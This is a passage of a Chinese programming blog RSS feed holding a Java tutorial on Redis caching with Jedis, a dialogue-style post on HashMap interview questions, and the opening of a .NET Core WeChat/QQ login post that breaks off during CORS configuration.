&lt;p&gt;查询内容列表时添加缓存。&lt;br/&gt;  1、查询数据库之前先查询缓存。&lt;br/&gt;  2、查询到结果，直接响应结果。&lt;br/&gt;  3、查询不到，缓存中没有需要查询数据库。&lt;br/&gt;  4、把查询结果添加到缓存中。&lt;br/&gt;  5、返回结果。&lt;br/&gt;向redis中添加缓存，添加缓存我们使用什么样的数据类型呢？&lt;br/&gt;  key：categoryId 字段(field)，即我们的查询条件&lt;br/&gt;  value：内容列表。由于redis中不能存java对象，所以需要把java对象转换成json格式的数据（即json字符串），可以使用工具类。&lt;br/&gt;推荐使用hash类型，因为hash类型可以对key进行归类。&lt;br/&gt;HASH_KEY:HASH&lt;br/&gt;      |--KEY:VALUE&lt;br/&gt;      |--KEY:VALUE&lt;br/&gt;      |--KEY:VALUE&lt;br/&gt;      |--KEY:VALUE&lt;br/&gt;&lt;code&gt;注意：添加缓存不能影响正常业务逻辑。&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;h632&quot;&gt;&lt;span&gt;&lt;strong&gt;6.3.2、代码实现&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;在ContentServiceImpl实现类中添加缓存。&lt;br/&gt;部分代码如下：&lt;/p&gt;
&lt;pre readability=&quot;12&quot;&gt;
&lt;code class=&quot;hljs php&quot; readability=&quot;18&quot;&gt;    &lt;br/&gt;@Autowired&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; JedisClient jedisClient;&lt;p&gt;@Value(&lt;span class=&quot;hljs-string&quot;&gt;&quot;${INDEX_CONTENT_KEY}&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String INDEX_CONTENT_KEY;&lt;/p&gt;&lt;p&gt;@Override&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt;&amp;lt;TbContent&amp;gt; getContentListByCategoryId(Long categoryId) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {&lt;br/&gt;String json = jedisClient.hget(INDEX_CONTENT_KEY, categoryId + &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (StringUtils.isNotBlank(json)) { &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt;&amp;lt;TbContent&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt; = JsonUtils.jsonToList(json, TbContent.class);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;Exception&lt;/span&gt; e) {&lt;br/&gt;e.printStackTrace();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;br/&gt;TbContentExample contentExample = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TbContentExample();&lt;br/&gt;Criteria criteria = contentExample.createCriteria();&lt;br/&gt;criteria.andCategoryIdEqualTo(categoryId);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt;&amp;lt;TbContent&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt; = contentMapper.selectByExample(contentExample);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {&lt;br/&gt;jedisClient.hset(&lt;span class=&quot;hljs-string&quot;&gt;&quot;INDEX_CONTENT_KEY&quot;&lt;/span&gt;, categoryId + &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;, JsonUtils.objectToJson(&lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt;));&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;Exception&lt;/span&gt; e) {&lt;br/&gt;e.printStackTrace();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;属性文件所在的位置：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSrZe.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;要想能加载还需要在taotao-content-service工程applicationContext-dao.xml中配置：
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;context:property-placeholder&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;location&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;classpath:properties/*.properties&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h64&quot;&gt;&lt;span&gt;&lt;strong&gt;6.4、缓存同步&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在对内容信息做&lt;code&gt;增删改&lt;/code&gt;操作后只需要把&lt;code&gt;对应缓存key&lt;/code&gt;删除即可。&lt;br/&gt;我们以【添加内容】为例，可以根据categoryId删除。&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;6&quot;&gt;    &lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; TaotaoResult &lt;span class=&quot;hljs-title&quot;&gt;saveContent&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(TbContent content)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;content.setCreated(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Date());&lt;br/&gt;content.setUpdated(content.getCreated());&lt;br/&gt;contentMapper.insert(content);&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {&lt;br/&gt;jedisClient.hdel(INDEX_CONTENT_KEY, content.getCategoryId().toString());&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception e) {&lt;br/&gt;e.printStackTrace();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; TaotaoResult.ok();&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 19 Nov 2018 15:42:00 +0000</pubDate>
<dc:creator>Lan&amp;amp;Jun</dc:creator>
<og:description>课程计划： 第五天 1、首页轮播图的展示 2、首页大广告展示流程图 3、Redis的安装及使用 4、Redis集群的搭建 5、向业务逻辑中添加缓存 6、Jedis的使用（redis的客户端） 7、缓存</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenmingjun/p/9986645.html</dc:identifier>
</item>
<item>
<title>HashMap？面试？我是谁？我在哪 - 卓庆森</title>
<link>http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</guid>
<description>&lt;p&gt;　　现在是晚上11点了，学校屠猪馆的自习室因为太晚要关闭了，勤奋且疲惫的小鲁班也从屠猪馆出来了，正准备回宿舍洗洗睡，由于自习室位置比较偏僻所以是接收不到手机网络信号的，因此小鲁班从兜里掏出手机的时候，信息可真是炸了呀，小鲁班心想，微信群平时都没什么人聊天，今晚肯定是发生了什么大事，仔细一看，才发现原来是小鲁班的室友达摩（光头）拿到了阿里巴巴JAVA开发实习生的offer，此时小鲁班真替他室友感到高兴的同时，心里也难免会产生一丝丝的失落感，那是因为自己投了很多份简历，别说拿不拿得到offer，就连给面试邀的公司也都寥寥无几，小鲁班这会可真是受到了一万点&lt;strong&gt;真实暴击&lt;/strong&gt;，不过小鲁班还是很乐观的，很快调整了心态，带上耳机，慢慢的走回了宿舍，正打算准备向他那神室友达摩取取经。&lt;/p&gt;
&lt;p&gt;　　片刻后~&lt;/p&gt;
&lt;p&gt;　　小鲁班：666，听说你拿到了阿里的offer，能透露一下面试内容和技巧吗&lt;/p&gt;
&lt;p&gt;　　达摩：嘿嘿嘿，没问题鸭，叫声爸爸我就告诉你&lt;/p&gt;
&lt;p&gt;　　小鲁班：baba（表面笑嘻嘻，心里MMP）&lt;/p&gt;
&lt;p&gt;　　达摩：其实我也不是很记得了（请继续装），但我还是记得那么一些，如果你是面的JAVA，首先当然是&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;　　JAVA的基础知识：数据结构（Map,List,Set等）,设计模式，算法，线程相关，IO/NIO，序列化等等&lt;/li&gt;
&lt;li&gt;　　其次是高级特征：反射机制，并发与锁，JVM（GC策略，类加载机制，内存模型）等等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　小鲁班：问这么多内容，那岂不是一个人都面试很久吗？&lt;/p&gt;
&lt;p&gt;　　达摩：不是的，面试官一般都会用连环炮的方式提问的。&lt;/p&gt;
&lt;p&gt;　　小鲁班：你说的连环炮是什么意思鸭？&lt;/p&gt;
&lt;p&gt;　　达摩：那我举个例子&lt;/p&gt;
&lt;p&gt;　　就比如问你HashMap是不是有序的？&lt;/p&gt;
&lt;p&gt;　　你回答不是有序的。那面试官就会可能继续问你，有没有有序的Map实现类呢？&lt;/p&gt;
&lt;p&gt;　　你如果这个时候说不知道的话，那这块问题就到此结束了。如果你说有TreeMap和LinkedHashMap。&lt;/p&gt;
&lt;p&gt;　　那么面试官接下来就可能会问你，TreeMap和LinkedHashMap是如何保证它的顺序的？&lt;/p&gt;
&lt;p&gt;　　如果你回答不上来，那么到此为止。如果你说TreeMap是通过实现SortMap接口，能够把它保存的键值对根据key排序，基于红黑树&lt;strong&gt;，&lt;/strong&gt;从而保证TreeMap中所有键值对处于有序状 态。LinkedHashMap则是通过插入排序（就是你put的时候的顺序是什么，取出来的时候就是什么样子）和访问排序（改变排序把访问过的放到底部）让键值有序。&lt;/p&gt;
&lt;p&gt;　　那么面试官还会继续问你，你觉得它们两个哪个的有序实现比较好？&lt;/p&gt;
&lt;p&gt;　　如果你依然可以回答的话，那么面试官会继续问你，你觉得还有没有比它更好或者更高效的实现方式。。无穷无尽深入，直到你回答不出来或者面试官认为问题到底了&lt;/p&gt;
&lt;p&gt;　　小鲁班捏了一把汗，我去。。。这是魔鬼吧，那我们来试试呗（因为小鲁班刚刚在自习室才看了这章的知识，想趁机装一波逼，毕竟刚刚叫了声爸爸~~）&lt;/p&gt;
&lt;p&gt;　　于是达摩and小鲁班就开始了对决：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;1.为什么用HashMap？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HashMap是一个散列桶（数组和链表），它存储的内容是键值对(key-value)映射&lt;/li&gt;
&lt;li&gt;HashMap采用了数组和链表的数据结构，能在查询和修改方便继承了数组的线性查找和链表的寻址修改&lt;/li&gt;
&lt;li&gt;HashMap是非synchronized，所以HashMap很快&lt;/li&gt;
&lt;li&gt;HashMap可以接受null键和值，而Hashtable则不能（原因就是equlas()方法需要对象，因为HashMap是后出的API经过处理才可以）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;2.HashMap的工作原理是什么？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HashMap是基于hashing的原理，我们使用put(key, value)存储对象到HashMap中，使用get(key)从HashMap中获取对象。当我们给put()方法传递键和值时，我们先对键调用hashCode()方法，计算并返回的hashCode是用于找到Map数组的bucket位置来储存Node 对象。这里关键点在于指出，HashMap是在bucket中储存键对象和值对象，作为Map.Node 。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119000932124-498988644.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;以下是HashMap初始化 ，简单模拟数据结构&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　  Node[] table=new Node[16]  散列桶初始化，table&lt;/p&gt;
&lt;p&gt;　　 class Node {&lt;/p&gt;
&lt;p&gt;　　　　hash;//hash值&lt;/p&gt;
&lt;p&gt;               key;//键&lt;/p&gt;
&lt;p&gt;　　　　value;//值&lt;/p&gt;
&lt;p&gt;　　　　node next;//用于指向链表的下一层（产生冲突，用拉链法）&lt;/p&gt;
&lt;p&gt;　　 }&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;以下是具体的put过程（JDK1.8版）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;          1.对Key求Hash值，然后再计算下标&lt;br/&gt;          2.如果没有碰撞，直接放入桶中（碰撞的意思是计算得到的Hash值相同，需要放到同一个bucket中）&lt;br/&gt;          3.如果碰撞了，以链表的方式链接到后面&lt;br/&gt;          4.如果链表长度超过阀值( TREEIFY THRESHOLD==8)，就把链表转成红黑树，链表长度低于6，就把红黑树转回链表&lt;br/&gt;          5.如果节点已经存在就替换旧值&lt;br/&gt;          6.如果桶满了(容量16*加载因子0.75)，就需要 resize（扩容2倍后重排）&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;以下是具体get过程(考虑特殊情况如果两个键的hashcode相同，你如何获取值对象？)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　当我们调用get()方法，HashMap会使用键对象的hashcode找到bucket位置，找到bucket位置之后，会调用keys.equals()方法去找到链表中正确的节点，最终找到要找的值对象。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119002141457-19724606.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;3.有什么方法可以减少碰撞？&lt;/strong&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;扰动函数可以减少碰撞，原理是如果两个不相等的对象返回不同的hashcode的话，那么碰撞的几率就会小些，这就意味着存链表结构减小，这样取值的话就不会频繁调用equal方法，这样就能提高HashMap的性能。（扰动即Hash方法内部的算法实现，目的是让不同对象返回不同hashcode。）&lt;/li&gt;
&lt;li&gt;使用不可变的、声明作final的对象，并且采用合适的equals()和hashCode()方法的话，将会减少碰撞的发生。不可变性使得能够缓存不同键的hashcode，这将提高整个获取对象的速度，使用String，Interger这样的wrapper类作为键是非常好的选择。为什么String, Interger这样的wrapper类适合作为键？因为String是final的，而且已经重写了equals()和hashCode()方法了。不可变性是必要的，因为为了要计算hashCode()，就要防止键值改变，如果键值在放入时和获取时返回不同的hashcode的话，那么就不能从HashMap中找到你想要的对象。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;4.HashMap中hash函数怎么是是实现的?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;我们可以看到在hashmap中要找到某个元素，需要根据key的hash值来求得对应数组中的位置。如何计算这个位置就是hash算法。前面说过hashmap的数据结构是数组和链表的结合，所以我们当然希望这个hashmap里面的元素位置尽量的分布均匀些，尽量使得每个位置上的元素数量只有一个，那么当我们用hash算法求得这个位置的时候，马上就可以知道对应位置的元素就是我们要的，而不用再去遍历链表。 所以我们首先想到的就是&lt;strong&gt;把hashcode对数组长度取模运算&lt;/strong&gt;，这样一来，元素的分布相对来说是比较均匀的。但是，“模”运算的消耗还是比较大的，能不能找一种更快速，消耗更小的方式，我们来看看JDK1.8的源码是怎么做的（被楼主修饰了一下）&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hash(Object key) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
    }
     &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; h;
     h&lt;/span&gt;=&lt;span&gt;key.hashCode()；返回散列值也就是hashcode
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ^ ：按位异或
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; &amp;gt;&amp;gt;&amp;gt;:无符号右移，忽略符号位，空位都以0补齐
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其中n是数组的长度，即Map的数组部分初始化长度&lt;/span&gt;
     &lt;span&gt;return&lt;/span&gt;  (n-1)&amp;amp;(h ^ (h &amp;gt;&amp;gt;&amp;gt; 16&lt;span&gt;));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119224252423-2018084724.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　简单来说就是&lt;/p&gt;
&lt;p&gt;          1.高16bt不变，低16bit和高16bit做了一个异或(得到的HASHCODE转化为32位的二进制，前16位和后16位低16bit和高16bit做了一个异或)&lt;br/&gt;          2.(n·1)&amp;amp;hash=-&amp;gt;得到下标&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;5.为什么要用红黑树？为什么不一直使用红黑树？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;为了解决二叉查找树的缺陷，二叉查找树在特殊情况下会变成一个线性结构，查找会非常慢。我们知道红黑树属于平衡二叉树，但是为了保持“平衡”是需要付出代价的，红黑树在插入新数据后可能需要通过左旋，右旋、变色这些操作来保持平衡，引入红黑树就是为了查找数据快，如果链表长度很短的话，根本不需要引入红黑树。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　6.说说你对红黑树的见解？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119224633228-1433434325.png&quot; alt=&quot;&quot; width=&quot;313&quot; height=&quot;226&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;每个节点非红即黑&lt;/li&gt;
&lt;li&gt;根节点总是黑色的&lt;/li&gt;
&lt;li&gt;如果节点是红色的，则它的子节点必须是黑色的（反之不一定）&lt;/li&gt;
&lt;li&gt;每个叶子节点都是黑色的空节点（NIL节点）&lt;/li&gt;
&lt;li&gt;从根节点到叶节点或空子节点的每条路径，必须包含相同数目的黑色节点（即相同的黑色高度）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　&lt;strong&gt;　7.解决hash 碰撞还有那些办法？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;开放定址法。&lt;/p&gt;
&lt;p&gt;　　当冲突发生时，使用某种探查技术在散列表中形成一个探查(测)序列。沿此序列逐个单元地查找，直到找到给定的地址。&lt;/p&gt;
&lt;p&gt;　　按照形成探查序列的方法不同，可将开放定址法区分为线性探查法、二次探查法、双重散列法等。&lt;/p&gt;
&lt;p&gt;　　下面给一个线性探查法的例子　　&lt;/p&gt;
&lt;p&gt;　　问题：已知一组关键字为(26，36，41，38，44，15，68，12，06，51)，用除余法构造散列函数，用线性探查法解决冲突构造这组关键字的散列表。&lt;/p&gt;
&lt;p&gt;　　解答：为了减少冲突，通常令装填因子α由除余法因子是13的散列函数计算出的上述关键字序列的散列地址为(0，10，2，12，5，2，3，12，6，12)。&lt;/p&gt;
&lt;p&gt;　    前5个关键字插入时，其相应的地址均为开放地址，故将它们直接插入T[0]，T[10)，T[2]，T[12]和T[5]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　　当插入第6个关键字15时，其散列地址2(即h(15)=15％13=2)已被关键字41(15和41互为同义词)占用。故探查h1=(2+1)％13=3，此地址开放，所以将15放入T[3]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   当插入第7个关键字68时，其散列地址3已被非同义词15先占用，故将其插入到T[4]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   当插入第8个关键字12时，散列地址12已被同义词38占用，故探查hl=(12+1)％13=0，而T[0]亦被26占用，再探查h2=(12+2)％13=1，此地址开放，可将12插入其中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   类似地，第9个关键字06直接插入T[6]中；而最后一个关键字51插人时，因探查的地址12，0，1，…，6均非空，故51插入T[7]中。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;8.如果HashMap的大小超过了负载因子(load factor)定义的容量，怎么办？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　默认的负载因子大小为0.75，也就是说，当一个map填满了75%的bucket时候，和其它集合类(如ArrayList等)一样，将会创建原来HashMap大小的两倍的bucket数组，来重新调整map的大小，并将原来的对象放入新的bucket数组中。这个过程叫作rehashing，因为它调用hash方法找到新的bucket位置。这个值只可能在两个地方，一个是原下标的位置，另一种是在下标为&amp;lt;原下标+原容量&amp;gt;的位置　　&lt;/p&gt;

&lt;p&gt;　   &lt;strong&gt;9.重新调整HashMap大小存在什么问题吗？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当重新调整HashMap大小的时候，确实存在条件竞争，因为如果两个线程都发现HashMap需要重新调整大小了，它们会同时试着调整大小。在调整大小的过程中，存储在链表中的元素的次序会反过来，因为移动到新的bucket位置的时候，HashMap并不会将元素放在链表的尾部，而是放在头部，这是为了避免尾部遍历(tail traversing)。如果条件竞争发生了，那么就死循环了。(多线程的环境下不使用HashMap）&lt;/li&gt;
&lt;li&gt;为什么多线程会导致死循环，它是怎么发生的？&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　HashMap的容量是有限的。当经过多次元素插入，使得HashMap达到一定饱和度时，Key映射位置发生冲突的几率会逐渐提高。这时候，HashMap需要扩展它的长度，也就是  　　进行Resize。1.扩容：创建一个新的Entry空数组，长度是原数组的2倍。2.ReHash：遍历原Entry数组，把所有的Entry重新Hash到新数组。&lt;/p&gt;
&lt;p&gt;     （这个过程比较烧脑，暂不作流程图演示，有兴趣去看看我的另一篇博文&quot;HashMap扩容全过程&quot;）&lt;/p&gt;

&lt;p&gt;　　达摩：哎呦，小老弟不错嘛~~意料之外呀&lt;/p&gt;
&lt;p&gt;　　小鲁班：嘿嘿，优秀吧，中场休息一波，我先喝口水&lt;/p&gt;
&lt;p&gt;　　达摩：不仅仅是这些哦，面试官还会问你相关的集合类对比，比如：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;10.HashTable&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数组 + 链表方式存储&lt;/li&gt;
&lt;li&gt;默认容量： 11(质数 为宜)&lt;/li&gt;
&lt;li&gt;put:
&lt;ul&gt;&lt;li&gt;索引计算 : （key.hashCode() &amp;amp; 0x7FFFFFFF）% table.length&lt;/li&gt;
&lt;li&gt;若在链表中找到了，则替换旧值，若未找到则继续&lt;/li&gt;
&lt;li&gt;当总元素个数超过容量*加载因子时，扩容为原来 2 倍并重新散列。&lt;/li&gt;
&lt;li&gt;将新元素加到链表头部&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;对修改 Hashtable 内部共享数据的方法添加了 synchronized，保证线程安全。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;11.HashMap ，HashTable 区别&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;默认容量不同。扩容不同&lt;/li&gt;
&lt;li&gt;线程安全性，HashTable 安全&lt;strong&gt;  &lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;效率不同 HashTable 要慢因为加锁&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;12.ConcurrentHashMap 原理&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;最大特点是引入了 CAS（借助 Unsafe 来实现【native code】）
&lt;ol&gt;&lt;li&gt;CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。&lt;/li&gt;
&lt;li&gt;Unsafe 借助 CPU 指令 cmpxchg 来实现&lt;/li&gt;
&lt;li&gt;使用实例：
&lt;ol&gt;&lt;li&gt;对 sizeCtl 的控制都是用 CAS 来实现的&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;sizeCtl ：默认为0，用来控制 table 的初始化和扩容操作。
&lt;ul&gt;&lt;li&gt;-1 代表table正在初始化&lt;/li&gt;
&lt;li&gt;N 表示有 -N-1 个线程正在进行扩容操作&lt;/li&gt;
&lt;li&gt;如果table未初始化，表示table需要初始化的大小。&lt;/li&gt;
&lt;li&gt;如果table初始化完成，表示table的容量，默认是table大小的0.75倍，居然用这个公式算0.75（n - (n &amp;gt;&amp;gt;&amp;gt; 2)）。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;CAS 会出现的问题：ABA
&lt;ul&gt;&lt;li&gt;对变量增加一个版本号，每次修改，版本号加 1，比较的时候比较版本号。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;　　&lt;strong&gt;13.我们可以使用CocurrentHashMap来代替Hashtable吗？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我们知道Hashtable是synchronized的，但是ConcurrentHashMap同步性能更好，因为它仅仅根据同步级别对map的一部分进行上锁。ConcurrentHashMap当然可以代替HashTable，但是HashTable提供更强的线程安全性。它们都可以用于多线程的环境，但是当Hashtable的大小增加到一定的时候，性能会急剧下降，因为迭代时需要被锁定很长的时间。因为ConcurrentHashMap引入了分割(segmentation)，不论它变得多么大，仅仅需要锁定map的某个部分，而其它的线程不需要等到迭代完成才能访问map。简而言之，在迭代的过程中，ConcurrentHashMap仅仅锁定map的某个部分，而Hashtable则会锁定整个map。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;　　此时躺着床上的张飞哄了一声：睡觉了睡觉了~&lt;/p&gt;
&lt;p&gt;　　见此不太妙：小鲁班立马回到床上（泉水），把被子盖过头，心里有一丝丝愉悦感，不对。好像还没洗澡。。。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;转载请注明出处，谢谢&lt;/strong&gt;&lt;/p&gt;







</description>
<pubDate>Mon, 19 Nov 2018 15:24:00 +0000</pubDate>
<dc:creator>卓庆森</dc:creator>
<og:description>现在是晚上11点了，学校屠猪馆的自习室因为太晚要关闭了，勤奋且疲惫的小鲁班也从屠猪馆出来了，正准备回宿舍洗洗睡，由于自习室位置比较偏僻所以是接收不到手机网络信号的，因此小鲁班从兜里掏出手机的时候，信息</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</dc:identifier>
</item>
<item>
<title>.net core 2.x - 微信、QQ 授权登录 - eSoftor</title>
<link>http://www.cnblogs.com/Tmc-Blog/p/9986482.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Tmc-Blog/p/9986482.html</guid>
<description>&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;上一篇是关于模拟请求配置，包括域名问题的解决，本篇就说下授权登录。嗯，比较闲。以前的fx 开发web的时候好像使用的 微信提供的js插件生成二维码，然后扫码登录，，，记不清了，好久不开发微信了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt; &lt;/h3&gt;
&lt;h3&gt;1.准备工作。&lt;/h3&gt;
&lt;h4&gt;1.1.单独解决ajax的跨域问题&lt;/h4&gt;
&lt;p&gt;首先考虑到web端（ajax）跨域的问题，所以我们首先要解决的就是在core中配置跨域的设置（案例比较多所以不多说只贴代码）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ConfigureServices中&lt;/span&gt;
services.AddCors(options =&amp;gt;&lt;span&gt;
            {
                options.AddPolicy(&lt;/span&gt;&lt;span&gt;&quot;Allow&lt;/span&gt;&lt;span&gt;CORS&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                builder &lt;/span&gt;=&amp;gt;&lt;span&gt;
                {
